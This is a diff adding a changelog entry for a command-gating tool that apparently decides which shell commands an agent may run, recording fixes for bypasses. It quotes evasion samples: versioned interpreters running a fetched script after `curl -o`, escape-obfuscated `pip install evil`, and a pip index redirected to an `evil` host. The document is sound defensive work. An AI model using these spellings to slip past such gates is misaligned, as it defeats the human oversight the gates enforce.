@@ -1,5 +1,155 @@
 # Changelog — Bootstrap Protocol implementation
 
+## 2.7.1 → 2.7.2 — three consumers of one reduction, and a decidability rule (2026-08-05)
+
+**PATCH**, on the criterion this file states: no configuration key exists that
+did not, and the emitted gates only got **stricter** — measured, not asserted.
+Across both merged PRs, **0 verdicts moved deny → allow** on either substrate
+(#49: a 27-row differential plus an exhaustive escape sweep; #52: ~190,600 SDK
+and ~142,700 shell rows over five corpora). `PROTOCOL_VERSION` in
+`lib/installer.py` and `lib/templates.py`, `plugin/plugin.json`'s version and
+its description prose, the version assertions in four suites, and the README's
+consumer pin target — which had been **stale at `v2.6.0` for three releases**
+and is now part of the release checklist.
+
+Contains PRs **#49** and **#52** (#52 supersedes #51 — see the GitHub-mechanics
+note below). Suite 7487 → **8373 checks**, 0 failed. Freeze-exceptions **42**
+(four amendments) and **43**.
+
+### Issue #50 — a versioned interpreter defeated the download-then-run walk
+
+`curl -o a.sh <url> ; python3.12 a.sh` executed the fetched bytes on **both**
+substrates while bare `python3` denied. The D20 launder-then-run walk tested
+interpreter membership **exactly** and never applied `INTERP_SUFFIX`. It was
+never a python-only class: `perl5.36`, `ruby3.2`, `node20`, `php8.2`, `bash5`,
+path-qualified, quoted and escaped forms — 16 spellings — all ran. The **pipe**
+trigger caught every one, because `interpreter_word()` applies the suffix over
+all of `INTERPRETERS`.
+
+This is the D3 shape issue #40 fixed twice, **on a third consumer nobody joined
+to the set**. #40's own note said "fix both spellings from one set"; *both* was
+the count of consumers known at the time. There were three. There are at least
+five — `_invoker_at` and its shell twin are a fourth and are recorded as X-36q,
+unfixed.
+
+**Where the reduction is read is the entire design, and the obvious site is
+wrong twice.** Reading it at the `_FILE_RUNNERS` arm — the first test in phase 1
+— resolves a command word out of an **assignment value, an attached flag value
+or a wrapper operand**, so `curl -o b.sh U ; A=/x/python3.12 sh -c "$(cat b.sh)"`
+goes deny → **ALLOW**: a one-token, attacker-chosen disarm prependable to any
+laundered payload. That arm also `break`s before `hit()` and the opaque
+path-form test, so both must return as guards — and the guards then fire on
+every *exact* member too, refusing **83 of 112** realistic fetch-then-use
+commands, which is precisely the shape **X-36h was reverted for**.
+
+The shipped fix reads the reduction in the **ordinary-word branch**, as a
+*tentative* command word applied only after the phase-2 forward scan finds
+nothing. Both failures die **by construction**: that branch is reached only
+after the assignment, prefix, compound-head and flag arms decline, and the two
+guards are the statements immediately above it. The `_FILE_RUNNERS` arms are
+left byte-identical on both substrates. `lib/cmdpos.py` is byte-identical too —
+`INTERP_SUFFIX` is **not** widened, so X-36i stays blocked behind X-36a.
+
+**The claim is CONVERGENCE, not "deny-only".** A versioned spelling now receives
+exactly the verdict its unversioned twin already received, and is never more
+permissive. What that costs, recorded because "0 newly refused" would mislead:
+**126 of 420** versioned fetch-then-use rows newly refuse (all behind a stage
+whose write cannot be named; **126 of 126** unversioned twins already denied);
+**792 new SDK-more-permissive splits** appear on space-quoted write targets,
+where the **SDK is the side that is right** (`my a.sh` is not `a.sh`) and the
+shell has over-keyed since v2.7.1; and a ~4%-wide band near 100 KB of
+single-token command word crosses the 60 s fail-closed ceiling.
+
+### X-36h Part 1 — decidability, not "does this word carry `$`"
+
+`$'\x70ip' install evil` and `pi${x:-p} install evil` bypassed the approved
+list. Two prior attempts were reverted, both keyed on the wrong signal: a word
+carrying `$` is *also* `$KUBECTL`, and narrowing by a trailing `INSTALL_VERBS`
+word refused 15 of 46 ordinary commands.
+
+The discriminator is **decidability — is the word's value visible in the command
+TEXT?** ANSI-C numeric escapes and a literal `${x:-default}` branch are; bare
+`$KUBECTL`/`$HELM`/`$BUILD` yield **no candidate at all**, which is what makes
+the over-refusal structurally impossible rather than merely unobserved. They
+become a third spelling off `command_spellings`. A decoded run is re-emitted
+**still quoted**, or `git commit -m $'pip install evil'` becomes three words and
+manufactures the X-36k over-refusal. `$(echo pip)` and the backtick form remain
+open as Part 2 — an owner call.
+
+### The attached short index flag was SDK-more-permissive
+
+`pip install -ihttp://evil/simple requests` was shell-deny / SDK-allow,
+redirecting an **approved** package to an attacker-controlled index: the shell
+arm ends `-i?*|-f?*`, the SDK's `_INDEX_FLAGS` was an exact-match frozenset.
+`--default-index` and `--index-strategy` were missing from the SDK set too —
+their URL spellings agreed **only by accident**, via the package check. Give
+them a local value and the SDK allowed alone.
+
+### Four defects the green suite could not see
+
+All found by adversarial passes on a tree that was passing 7942 checks:
+
+* **The octal branch treated the value as a code point.** Bash treats it as a
+  **byte** (`printf '\560'` is `p`), so the shell decoded and both Python copies
+  did not — 89 values, SDK-more-permissive. The fix had turned a *symmetric*
+  fail-open into an *asymmetric* one, which is **worse than leaving the row
+  open**, because parity is the mechanism meant to catch it.
+* **The escape regex advanced one character on a non-numeric escape**, so the
+  `x41` inside `\\x41` decoded and the SDK denied commands bash never runs.
+* **`_param_default` was O(n²)** and a 126 KB command that *passed* at v2.7.1 was
+  killed by the 60 s fail-closed ceiling. Chunking alone was measured
+  insufficient; a length budget was needed too.
+* **The budget compared different units per substrate** — `${#var}` counts bytes
+  under `LC_ALL=C` and characters under UTF-8. Now UTF-8 bytes everywhere:
+  bytes is the only unit bash can compute in *every* locale.
+
+### Method notes, because they are why the above was found
+
+**Review the plan, not just the code.** Two plan-review passes blocked the #50
+plan before a line was written; both of its failures were designed in and would
+otherwise have surfaced only after implementation.
+
+**A judge that only scores designs inherits their shared blind spot.** All three
+designers reported "0 allow-direction moves"; the judge re-measured and found
+144; a reviewer re-measured the judge and found the class was *wider* than its
+decomposition claimed.
+
+**A census can only refute what its shapes reach.** The 190-command census that
+cleared the guards structurally could not contain the shape where the collateral
+lands.
+
+**Reproduce a number before inheriting it.** The plan's O(len²) claim was
+withdrawn at implementation: its payload put the long token in an operand, which
+is never reduced.
+
+**Mutation-test the guarantee.** Every sweep here was proved *able to fail* by
+reverting each fix independently.
+
+**A fresh D3 instance appeared inside the fix for a D3 defect** — two new phase-2
+invoker arms spelled from `ALL_INVOKERS` vs `INVOKERS`, inert only because the
+reduction cannot return a `DUAL` word. One spelling now, pinned over the emitted
+artifacts.
+
+### GitHub mechanics — a recorded trap that was WRONG
+
+The previous release note recorded that *"a stacked PR auto-retargets when its
+base branch is **deleted**"*. **That is false.** Merging #49 with
+`--delete-branch` **closed** the stacked #51 outright; a closed PR can neither
+have its base changed (`Cannot change the base branch of a closed pull request`)
+nor be reopened once its base ref is gone. #52 is the same branch and the same
+commit, re-opened against `main`. No work was lost, but the recorded rule cost a
+PR number and is corrected here.
+
+### Backlog
+
+New rows **X-36q** (a fourth consumer of the reduction — `_invoker_at` leaks 40
+of 40 versioned invoker spellings), **X-36r**, **X-36s**, **X-36t**. Still open
+and unchanged: X-36a must precede X-36i (i alone ships 161 new
+SDK-more-permissive splits); **X-36g is the cluster pivot and needs an owner
+posture ruling**; X-36f must not ship alone; X-36b Stage 1 follows g and Stage 2
+is barred; X-36h Part 2 is an owner call.
+
+
 ## 2.7.0 → 2.7.1 — the ceiling, the converter, and the word bash resolves (2026-08-04)
 
 **PATCH.** No configuration key exists that did not, and the emitted gates only
